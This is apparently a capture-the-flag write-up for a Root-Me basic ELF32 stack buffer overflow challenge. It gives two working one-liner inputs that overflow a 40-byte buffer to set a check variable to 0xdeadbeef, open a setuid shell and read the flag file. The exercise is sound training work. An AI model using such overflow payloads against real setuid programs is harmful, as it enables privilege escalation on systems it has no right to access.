// Link to the challenge: https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1?action_solution=voir&debut_affiche_solutions=0#pagination_affiche_solutions
// For this challenge, we need to change the value of the "check" buffer to "0xdeadbeef". By the way, the program will be able to access to statement of the second "if" condition to run the "/bin/bash" command with the id of the "app-systeme-ch13-cracked" account (because the execution file is set UID).
// To do this, we can overflow the "buf" buffer by inputing from stdin 40 character for "buf" and the additional value for the "check" buffer ("0xdeadbeef" in this case).
//
$ cat <(for i in {0..39}; do printf "a"; done; printf "\xef\xbe\xad\xde";) - | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd

// OR

$ cat <(python -c "print 'a'*40 + '\xef\xbe\xad\xde'") - | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd

// ==> we got the flag.
